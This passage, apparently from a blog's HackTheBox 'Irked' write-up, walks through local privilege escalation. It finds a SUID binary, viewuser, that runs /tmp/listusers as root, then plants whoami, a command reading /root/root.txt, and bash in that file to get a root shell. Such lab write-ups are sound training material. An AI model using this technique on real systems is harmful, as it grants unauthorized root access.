+<span class="go">-rwsr-sr-x 1 daemon daemon 50644 Sep 30  2014 /usr/bin/at                                               </span>
+<span class="go">-rwsr-xr-x 1 root root 18072 Sep  8  2016 /usr/bin/pkexec                                                                                                                                                        </span>
+<span class="go">-rwsr-sr-x 1 root root 9468 Apr  1  2014 /usr/bin/X                                                                                                                                                              </span>
+<span class="go">-rwsr-xr-x 1 root root 53112 May 17  2017 /usr/bin/passwd                                                                                                                                                        </span>
+<span class="go">-rwsr-xr-x 1 root root 52344 May 17  2017 /usr/bin/chfn                                                                                                                                                          </span>
+<span class="go">-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser                                                                                                                                                       </span>
+<span class="go">-rwsr-xr-x 1 root root 96760 Aug 13  2014 /sbin/mount.nfs                                                                                                                                                        </span>
+<span class="go">-rwsr-xr-x 1 root root 38868 May 17  2017 /bin/su                                                       </span>
+<span class="go">-rwsr-xr-x 1 root root 34684 Mar 29  2015 /bin/mount                                                    </span>
+<span class="go">-rwsr-xr-x 1 root root 34208 Jan 21  2016 /bin/fusermount                                                                                                                                                        </span>
+<span class="go">-rwsr-xr-x 1 root root 161584 Jan 28  2017 /bin/ntfs-3g                                                 </span>
+<span class="go">-rwsr-xr-x 1 root root 26344 Mar 29  2015 /bin/umount    </span>
+</pre></div>
+
+
+<p>from the above files, <code>/usr/bin/viewuser</code> is not a common I usually see. To be honest is also difficult to identify these kind of things, it takes lot of experience. I initially ignored all the SUID files as nothing jumped out at first glance, and only later I got back and inspect carefully when I could not find anything else. </p>
+<div class="highlight"><pre><span></span><span class="gp">djmardov@irked:~/Documents$</span> ls -l /usr/bin/viewuser 
+<span class="go">-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser</span>
+<span class="gp">djmardov@irked:~/Documents$</span> viewuser 
+<span class="go">This application is being devleoped to set and test user permissions</span>
+<span class="go">It is still being actively developed</span>
+<span class="gp gp-VirtualEnv">(unknown)</span> <span class="go">:0           2020-06-04 09:20 (:0)</span>
+<span class="go">djmardov pts/1        2020-06-05 07:12 (10.10.14.18)</span>
+<span class="go">sh: 1: /tmp/listusers: not found</span>
+</pre></div>
+
+
+<p>As we have permissions, I run the binary and get the above output. We can see there is a reference to another file that is not found, <code>/tmp/listusers</code>. </p>
+<p>Let's create that file containing the <code>whoami</code> binary:</p>
+<div class="highlight"><pre><span></span><span class="gp">djmardov@irked:~/Documents$</span> <span class="nb">echo</span> whoami &gt; /tmp/listusers
+<span class="gp">djmardov@irked:~/Documents$</span> viewuser 
+<span class="go">This application is being devleoped to set and test user permissions</span>
+<span class="go">It is still being actively developed</span>
+<span class="gp gp-VirtualEnv">(unknown)</span> <span class="go">:0           2020-06-04 09:20 (:0)</span>
+<span class="go">djmardov pts/1        2020-06-05 07:12 (10.10.14.18)</span>
+<span class="go">sh: 1: /tmp/listusers: Permission denied</span>
+</pre></div>
+
+
+<p>Now it is not complaining about the file existence anymore but about permissions. Having a look at the file, root has read and write but not execute permissions:</p>
+<div class="highlight"><pre><span></span><span class="gp">djmardov@irked:~/Documents$</span> ls -l /tmp/listusers 
+<span class="go">-rw-r--r-- 1 djmardov djmardov 13 Jun  5 08:10 /tmp/listusers</span>
+</pre></div>
+
+
+<p>So I'll make the file executable:</p>
+<div class="highlight"><pre><span></span><span class="gp">djmardov@irked:~/Documents$</span> chmod +x /tmp/listusers 
+<span class="gp">djmardov@irked:~/Documents$</span> ls -l /tmp/listusers 
+<span class="go">-rwxr-xr-x 1 djmardov djmardov 13 Jun  5 08:10 /tmp/listusers</span>
+</pre></div>
+
+
+<p>Then I run it again:</p>
+<div class="highlight"><pre><span></span><span class="gp">djmardov@irked:~$</span> <span class="nb">echo</span> whoami &gt; /tmp/listusers
+<span class="gp">djmardov@irked:~$</span> viewuser 
+<span class="go">This application is being devleoped to set and test user permissions</span>
+<span class="go">It is still being actively developed</span>
+<span class="gp gp-VirtualEnv">(unknown)</span> <span class="go">:0           2020-06-04 09:20 (:0)</span>
+<span class="go">djmardov pts/1        2020-06-05 07:12 (10.10.14.18)</span>
+<span class="go">root</span>
+</pre></div>
+
+
+<p>Since the <code>viewuser</code> script is owned by root we can see <code>whoami</code> command returns root. </p>
+<p>to get the root flag we can do the following:</p>
+<div class="highlight"><pre><span></span><span class="gp">djmardov@irked:~$</span> <span class="nb">echo</span> <span class="s2">&quot;cat /root/root.txt&quot;</span> &gt; /tmp/listusers 
+<span class="gp">djmardov@irked:~$</span> viewuser 
+<span class="go">This application is being devleoped to set and test user permissions</span>
+<span class="go">It is still being actively developed</span>
+<span class="gp gp-VirtualEnv">(unknown)</span> <span class="go">:0           2020-06-04 09:20 (:0)</span>
+<span class="go">djmardov pts/1        2020-06-05 07:12 (10.10.14.18)</span>
+<span class="go">8d****************************f3</span>
+</pre></div>
+
+
+<p>Or to get a full shell we can do this:</p>
+<div class="highlight"><pre><span></span><span class="gp">djmardov@irked:~$</span> <span class="nb">echo</span> bash &gt; /tmp/listusers 
+<span class="gp">djmardov@irked:~$</span> view
+<span class="gp">djmardov@irked:~$</span> viewuser 
+<span class="go">This application is being devleoped to set and test user permissions</span>
+<span class="go">It is still being actively developed</span>
+<span class="gp gp-VirtualEnv">(unknown)</span> <span class="go">:0           2020-06-04 09:20 (:0)</span>
+<span class="go">djmardov pts/1        2020-06-05 07:12 (10.10.14.18)</span>
+<span class="gp">root@irked:~#</span> whoami
+<span class="go">root</span>
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Irked.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Irked"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
